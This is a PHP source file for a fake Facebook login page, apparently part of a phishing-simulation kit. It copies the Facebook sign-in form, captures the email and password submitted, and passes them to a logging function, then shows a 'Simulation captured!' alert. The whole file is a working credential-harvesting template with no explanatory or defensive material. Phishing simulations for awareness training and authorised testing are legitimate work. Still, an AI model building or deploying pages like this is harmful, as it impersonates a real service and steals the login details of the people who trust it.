<?php
require __DIR__ . '/../../includes/config.php';
require __DIR__ . '/../../includes/functions.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['email'] ?? '';
    $pass = $_POST['pass'] ?? '';
    log_data("Facebook", ["email" => $user, "password" => $pass]);
    echo "<script>alert('Simulation captured! Check terminal logs.');window.location='index.php';</script>";
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="login-box">
    <h1>Facebook</h1>
    <form method="POST">
        <input type="text" name="email" placeholder="Email or Phone"><br>
        <input type="password" name="pass" placeholder="Password"><br>
        <button type="submit">Log In</button>
    </form>
</div>
</body>
</html>
